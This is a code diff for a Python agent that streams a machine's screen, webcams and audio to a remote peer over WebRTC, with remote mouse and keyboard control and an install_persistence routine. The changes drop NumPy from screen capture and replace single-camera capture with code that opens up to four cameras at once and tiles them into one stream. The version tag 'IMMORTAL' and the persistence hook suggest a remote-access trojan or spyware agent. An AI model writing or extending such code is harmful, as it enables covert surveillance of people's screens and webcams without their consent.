@@ -18,12 +18,11 @@ from PIL import Image, ImageDraw, ImageFont
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
-import cv2
-import numpy
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.2.4-IMMORTAL"
+AGENT_VERSION = "9.2.5-NONUMPY"
+target_fps = 30
 
 def install_persistence():
     current_exe = sys.executable
@@ -247,21 +246,19 @@ class ScreenVideoTrack(VideoStreamTrack):
                 mon = self.sct.monitors[mon_idx]
                 sct_img = self.sct.grab(mon)
                 
-                # Bypass PIL: Parse Raw Bytes into OpenCV numpy array
-                bgra = numpy.frombuffer(sct_img.bgra, dtype=numpy.uint8).reshape(mon["height"], mon["width"], 4)
+                # Pure PIL Image Pipeline (NumPy-Free)
+                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                 
                 # Mandatory 720p scaling for AnyDesk-like fluidity
                 w, h = mon["width"], mon["height"]
                 limit = 1280
-                
                 new_h = int(h * (limit / w))
                 new_h -= new_h % 2
                 
-                # Hardware Accelerated Resizing
-                bgra = cv2.resize(bgra, (limit, new_h), interpolation=cv2.INTER_LINEAR)
-                rgb = cv2.cvtColor(bgra, cv2.COLOR_BGRA2RGB)
+                img = img.resize((limit, new_h), Image.Resampling.LANCZOS)
                 
-                frame = av.VideoFrame.from_ndarray(rgb, format='rgb24')
+                # Convert to VideoFrame directly from PIL
+                frame = av.VideoFrame.from_image(img)
                 frame = frame.reformat(format='yuv420p')
         except Exception as e:
             import traceback
@@ -274,22 +271,12 @@ class ScreenVideoTrack(VideoStreamTrack):
         frame.time_base = time_base
         return frame
 
-class CameraVideoTrack(VideoStreamTrack):
+class AllCamsVideoTrack(VideoStreamTrack):
     def __init__(self):
         super().__init__()
-        self.camera_index = 0
-        self.cap = None
+        self.caps = {}
         self.last_frame_time = 0
     
-    def update_settings(self, settings: dict):
-        if "camera" in settings:
-            idx = int(settings["camera"])
-            if idx != self.camera_index:
-                self.camera_index = idx
-                if self.cap:
-                    self.cap.release()
-                    self.cap = None
-
     async def recv(self):
         now = time.time()
         wait = (1.0 / target_fps) - (now - self.last_frame_time)
@@ -298,23 +285,61 @@ class CameraVideoTrack(VideoStreamTrack):
         
         pts, time_base = await self.next_timestamp()
         
-        if self.cap is None:
-            self.cap = cv2.VideoCapture(self.camera_index, cv2.CAP_DSHOW)
+        try:
+            import cv2
+            import numpy
             
-        ret, frame = self.cap.read()
-        if not ret:
-            v_frame = av.VideoFrame(width=640, height=480, format='yuv420p')
-            for p in v_frame.planes: p.update(b'\x00' * p.buffer_size)
-            v_frame.pts = pts
-            v_frame.time_base = time_base
-            return v_frame
+            # Find all available cameras
+            available = []
+            for i in range(4): # Check first 4 indices
+                if i not in self.caps:
+                    cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
+                    if cap.isOpened():
+                        self.caps[i] = cap
+                    else:
+                        cap.release()
+                
+                if i in self.caps:
+                    ret, frame = self.caps[i].read()
+                    if ret: available.append(frame)
             
-        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        v_frame = av.VideoFrame.from_ndarray(frame_rgb, format='rgb24')
-        v_frame = v_frame.reformat(format='yuv420p')
+            if not available:
+                raise Exception("No cameras detected")
+            
+            # Tile cameras into a grid
+            count = len(available)
+            cell_w, cell_h = 640, 480
+            cols = 2 if count > 1 else 1
+            rows = (count + cols - 1) // cols
+            
+            grid = Image.new("RGB", (cols * cell_w, rows * cell_h), (20, 20, 20))
+            for i, frame in enumerate(available):
+                # Frame from OpenCV is numpy BGR
+                rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                img = Image.fromarray(rgb)
+                img.thumbnail((cell_w-10, cell_h-10), Image.Resampling.BILINEAR)
+                col, row = i % cols, i // cols
+                grid.paste(img, (col * cell_w + (cell_w - img.width)//2, row * cell_h + (cell_h - img.height)//2))
+            
+            v_frame = av.VideoFrame.from_image(grid)
+            v_frame = v_frame.reformat(format='yuv420p')
+            
+        except Exception as e:
+            # Error fallback: Show error message in video stream
+            error_img = Image.new("RGB", (1280, 720), (40, 0, 0))
+            draw = ImageDraw.Draw(error_img)
+            draw.text((100, 300), f"CAMERA SYSTEM ERROR: {str(e)}", fill=(255, 255, 255))
+            draw.text((100, 350), "Webcam requires OpenCV/NumPy. Core Agent is safe.", fill=(200, 200, 200))
+            v_frame = av.VideoFrame.from_image(error_img)
+            v_frame = v_frame.reformat(format='yuv420p')
+
         v_frame.pts = pts
         v_frame.time_base = time_base
         return v_frame
+
+    def __del__(self):
+        for cap in self.caps.values():
+            cap.release()
 
 class SystemAudioTrack(AudioStreamTrack):
     async def recv(self):
@@ -352,7 +377,7 @@ async def start_session(ws, sct):
         iceServers=[RTCIceServer(urls=["stun:stun.l.google.com:19302"])]
     ))
     video_track = ScreenVideoTrack(sct)
-    camera_track = CameraVideoTrack()
+    camera_track = AllCamsVideoTrack()
 
     @pc.on("iceconnectionstatechange")
     async def on_iceconnectionstatechange():
